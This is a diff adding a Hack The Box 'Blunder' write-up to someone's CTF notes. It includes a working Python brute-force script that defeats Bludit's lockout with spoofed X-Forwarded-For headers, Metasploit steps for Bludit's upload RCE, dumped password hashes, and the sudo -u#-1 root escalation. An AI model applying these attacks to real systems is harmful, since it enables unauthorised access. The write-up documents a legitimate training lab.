@@ -15,6 +15,7 @@ System own means that I obtained a root flag... where I have admin privileges on
 * [OpenAdmin](#openadmin-writeup)
 * [Registry](#registry-writeup)
 * [Sauna](#sauna-writeup)
+* [Blunder](#blunder-writeup)
 
 ## Craft Writeup:
 
@@ -689,3 +690,244 @@ Evil winrm with admin hash
 `evil-winrm -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff`
 
 ### Get root flag! :)
+
+## Blunder Writeup:
+
+This is the most recent box that I have done, root was pretty standard but I learnt of some new tools such as cewl that will be very useful in the future.
+`PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))`
+
+
+In robots.txt:
+
+User-agent: *
+Allow: /
+
+
+Using gobuster:
+`
+http://10.10.10.191/.hta (Status: 403)
+http://10.10.10.191/.htaccess (Status: 403)
+http://10.10.10.191/.htpasswd (Status: 403)
+http://10.10.10.191/0 (Status: 200)
+http://10.10.10.191/about (Status: 200)
+http://10.10.10.191/admin (Status: 301)
+http://10.10.10.191/cgi-bin/ (Status: 301)
+http://10.10.10.191/LICENSE (Status: 200)
+http://10.10.10.191/robots.txt (Status: 200)
+http://10.10.10.191/server-status (Status: 403)
+`
+
+
+http://10.10.10.191/admin/ has login page.
+
+Uses bludit...
+
+After a few tries ip is blocked and have to try again in a few minutes... way to bypass this?
+
+take a look at bludit docs...
+Brute force protection section in security tab.
+
+There is a Security Object called $security, and the class of the object is /bl-kernel/security.class.php. Take a look at the variables inside the class.
+
+
+`private $dbFields = array(
+    'minutesBlocked'=>5,
+    'numberFailuresAllowed'=>10,
+    'blackList'=>array());
+
+    minutesBlocked: Amount of minutes the IP is going to be blocked.
+    numberFailuresAllowed: Number of failed attempts for the block to trigger.
+    blackList: The list of IPs blocked.
+`
+    
+I think it's running bludit 3.9.2
+
+Look up CVE of bludit 3.9.2
+
+Code execution vulnerability found.
+Also a brute force attack bypass vulnerability!
+
+Bludit adds your IP address to the X-Forwarded-For header tag to the login request that you send to the web server and using this method it keeps count of the requests that you make to the web application.
+"using unique X-Forwarded-For addresses for each request. As there is no validation, simply using the value of the password being attempted will work, allowing for a brute force without the risk of locking anyone out at all"
+
+
+
+todo.txt found with wfuzz:
+`wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://10.10.10.191/FUZZ.txt" -t 100`
+
+someone named "fergus" mentioned. try using that as username.
+
+
+use cewl to generate wordlist:
+
+`cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191/`
+
+CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.
+```python
+import re
+import requests
+#from __future__ import print_function
+
+def open_ressources(file_path):
+    return [item.replace("\n", "") for item in open(file_path).readlines()]
+
+host = 'http://10.10.10.191'
+login_url = host + '/admin/login'
+username = 'fergus'
+wordlist = open_ressources('/root/hackthebox/blunder/wordlists.txt')
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+    print('[*] Trying: {p}'.format(p = password))
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print()
+            print('SUCCESS: Password found!')
+            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print()
+            break
+
+```
+
+
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login.
+
+code execution vuln found here:
+https://github.com/bludit/bludit/issues/1081
+
+
+can use msf to do it quickly.
+
+`msf5 > use exploit/linux/http/bludit_upload_images_exec
+msf5 exploit(linux/http/bludit_upload_images_exec) > set TARGET 0
+msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOST 10.10.10.191
+msf5 exploit(linux/http/bludit_upload_images_exec) > set RPORT 80
+msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
+BLUDITUSER => fergus
+msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
+BLUDITPASS => RolandDeschain
+msf5 exploit(linux/http/bludit_upload_images_exec) > exploit`
+
+Once meterpreter opens use "shell" command to spawn a shell on the machine.
+We got www-data.
+
+Make it easier for us by spawning a terminal with:
+python -c "import pty;pty.spawn('/bin/bash')"
+
+in /var/www/bludit-3.9.2/bl-content/databases
+
+cat users.php
+
+Find passwords and usernames...
+`<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Admin",
+        "firstName": "Administrator",
+        "lastName": "",
+        "role": "admin",
+        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
+        "salt": "5dde2887e7aca",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""
+    },
+    "fergus": {
+        "firstName": "",
+        "lastName": "",
+        "nickname": "",
+        "description": "",
+        "role": "author",
+        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
+        "salt": "jqxpjfnv",
+        "email": "",
+        "registered": "2019-11-27 13:26:44",
+        "tokenRemember": "",
+        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "codepen": "",
+        "instagram": "",
+        "github": "",
+        "gitlab": "",
+        "linkedin": "",
+        "mastodon": ""
+    }
+`
+
+also in /var/www/bludit-3.10.0a/bl-content/databases
+`
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+`
+use john to try crack hashes. Huga hash cracks to Password120
+
+> su hugo
+use Password120 as password.
+
+### Get user flag.
+
+run sudo -l command:
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+
+
+https://gtfobins.github.io/gtfobins/bash/
+https://n0w4n.nl/sudo-security-bypass/
+
+`sudo -u#-1 /bin/bash`
+
+### Get root!!
+
